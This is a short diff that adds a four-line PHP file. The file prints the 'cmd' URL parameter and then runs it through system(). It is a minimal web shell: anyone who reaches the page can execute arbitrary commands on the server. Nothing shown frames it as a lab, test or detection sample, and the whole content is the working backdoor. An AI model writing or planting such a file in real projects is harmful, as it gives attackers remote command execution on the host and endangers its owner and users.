@@ -1,0 +1,4 @@
+<?php
+    echo "Command: ".htmlspecialchars($_GET['cmd'])."<br>";
+    system($_GET['cmd']);
+?>
